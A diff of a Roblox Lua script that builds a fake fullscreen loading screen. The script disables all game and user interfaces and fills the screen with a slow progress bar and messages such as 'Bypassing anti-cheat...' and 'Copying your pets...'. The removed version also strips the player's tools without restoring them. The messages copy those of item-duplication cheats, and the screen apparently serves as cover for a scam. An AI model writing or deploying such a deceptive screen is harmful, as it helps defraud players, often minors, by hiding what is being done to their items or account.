@@ -1,149 +1,109 @@
--- Settings
-local totalTimePerPercent = 2 -- seconds per 1%
-local totalPercent = 100
-local totalTime = totalTimePerPercent * totalPercent
-
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+-- Setup
+local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
-local backpack = player:WaitForChild("Backpack")
+
+-- Hide Core Roblox UI
 local StarterGui = game:GetService("StarterGui")
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
--- Create ScreenGui
+-- Hide all user GUIs in PlayerGui
+for _, gui in pairs(playerGui:GetChildren()) do
+	if gui:IsA("ScreenGui") and gui.Name ~= "FakeLoadingUI" then
+		gui.Enabled = false
+	end
+end
+
+-- Create Fullscreen GUI
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FakeLoadingScreen"
+screenGui.Name = "FakeLoadingUI"
 screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
 screenGui.Parent = playerGui
-screenGui.Enabled = false -- start invisible
 
--- Background Frame (fullscreen black)
+-- Full black background
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bg.BorderSizePixel = 0
 bg.Parent = screenGui
 
--- Loading Bar Background
-local barBack = Instance.new("Frame")
-barBack.Size = UDim2.new(0.6, 0, 0.05, 0)
-barBack.Position = UDim2.new(0.2, 0, 0.5, 0)
-barBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-barBack.BorderSizePixel = 0
-barBack.Parent = bg
+-- Loading bar container
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0.5, 0, 0.1, 0)
+container.Position = UDim2.new(0.25, 0, 0.5, 0)
+container.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+container.BorderSizePixel = 0
+container.Parent = bg
 
--- Loading Bar Fill
-local barFill = Instance.new("Frame")
-barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-barFill.BorderSizePixel = 0
-barFill.Parent = barBack
+-- Progress bar background
+local barBG = Instance.new("Frame")
+barBG.Size = UDim2.new(0.95, 0, 0.4, 0)
+barBG.Position = UDim2.new(0.025, 0, 0.5, 0)
+barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBG.BorderSizePixel = 0
+barBG.Parent = container
 
--- Percentage Text
-local percentText = Instance.new("TextLabel")
-percentText.Size = UDim2.new(0.6, 0, 0.07, 0)
-percentText.Position = UDim2.new(0.2, 0, 0.44, 0)
-percentText.BackgroundTransparency = 1
-percentText.TextColor3 = Color3.new(1, 1, 1)
-percentText.Font = Enum.Font.GothamBold
-percentText.TextSize = 30
-percentText.Text = "0%"
-percentText.Parent = bg
+-- Actual progress bar
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+bar.BorderSizePixel = 0
+bar.Parent = barBG
 
--- Fake loading message text
+-- Percentage text
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Size = UDim2.new(1, 0, 0.4, 0)
+percentLabel.Position = UDim2.new(0, 0, 0.05, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentLabel.Font = Enum.Font.SourceSansBold
+percentLabel.TextScaled = true
+percentLabel.Text = "0%"
+percentLabel.Parent = container
+
+-- Status text under the bar
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, 0, 0.4, 0)
+statusLabel.Position = UDim2.new(0, 0, 1.0, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+statusLabel.Font = Enum.Font.SourceSans
+statusLabel.TextScaled = true
+statusLabel.Text = "Initializing..."
+statusLabel.Parent = container
+
+-- Friendly fake status messages
 local messages = {
-    "Bypassing anti-cheat...",
-    "Copying your pets...",
-    "Initializing game data...",
-    "Loading assets...",
-    "Syncing server info...",
-    "Almost there...",
+	"Bypassing anti-cheat...",
+	"Copying your pets...",
+	"Checking if script is online...",
+	"Analyzing backpack contents...",
+	"Scanning server...",
+	"Gathering session info...",
+	"Confirming connection...",
+	"Decrypting banana...",
+	"Calculating trustworthiness...",
+	"Loading memes..."
 }
 
-local msgText = Instance.new("TextLabel")
-msgText.Size = UDim2.new(0.6, 0, 0.05, 0)
-msgText.Position = UDim2.new(0.2, 0, 0.57, 0)
-msgText.BackgroundTransparency = 1
-msgText.TextColor3 = Color3.new(1, 1, 1)
-msgText.Font = Enum.Font.GothamItalic
-msgText.TextSize = 20
-msgText.Text = ""
-msgText.Parent = bg
+-- Animate loading over 2 minutes (2 sec per 1%)
+local steps = 100
+local timePerStep = 2
+local progress = 0
 
--- Hide player's Backpack items
-local function hideBackpackItems(hide)
-    for _, item in pairs(backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            item.Parent = hide and nil or backpack
-        end
-    end
+while progress <= 100 do
+	percentLabel.Text = progress .. "%"
+	bar.Size = UDim2.new(progress / 100, 0, 1, 0)
+	if progress % 10 == 0 then
+		statusLabel.Text = messages[math.random(1, #messages)]
+	end
+	progress += 1
+	wait(timePerStep)
 end
 
--- Hide player character tools as well
-local function hideCharacterTools(hide)
-    local character = player.Character
-    if character then
-        for _, item in pairs(character:GetChildren()) do
-            if item:IsA("Tool") then
-                item.Parent = hide and nil or character
-            end
-        end
-    end
-end
+-- End of loading, UI stays hidden
+screenGui:Destroy()
 
--- We can alternatively just disable the backpack and character tools visually by unequipping and making invisible
-
--- Start loading function
-local function startLoading()
-    screenGui.Enabled = true
-    
-    -- Hide backpack and character tools (unequip all tools)
-    -- Unequip tools
-    player.Character.Humanoid:UnequipTools()
-    
-    -- Remove tools temporarily from backpack and character
-    local storedBackpackItems = {}
-    local storedCharacterItems = {}
-    
-    for _, tool in pairs(backpack:GetChildren()) do
-        if tool:IsA("Tool") then
-            tool.Parent = nil
-            table.insert(storedBackpackItems, tool)
-        end
-    end
-    local character = player.Character
-    if character then
-        for _, tool in pairs(character:GetChildren()) do
-            if tool:IsA("Tool") then
-                tool.Parent = nil
-                table.insert(storedCharacterItems, tool)
-            end
-        end
-    end
-    
-    -- Hide default Roblox UI
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-    
-    -- Loading loop
-    for percent = 1, totalPercent do
-        -- Update bar
-        barFill.Size = UDim2.new(percent / totalPercent, 0, 1, 0)
-        percentText.Text = tostring(percent) .. "%"
-        
-        -- Update message every few percents
-        if percent % 20 == 0 then
-            local newMsg = messages[math.random(1, #messages)]
-            msgText.Text = newMsg
-        end
-        
-        wait(totalTimePerPercent)
-    end
-    
-    -- Stay at 100%, do not kick
-    
-    -- Optional: keep hiding everything, or restore here if you want to make it usable again
-    -- For your request, keep hidden and loading screen visible
-    
-    -- Do NOT restore tools or UI
-end
-
--- Start the loading automatically (you can call this manually if you want)
-startLoading()
+-- Keep other GUIs hidden & player can move
+-- (Optionally restore GUIs here if you want)
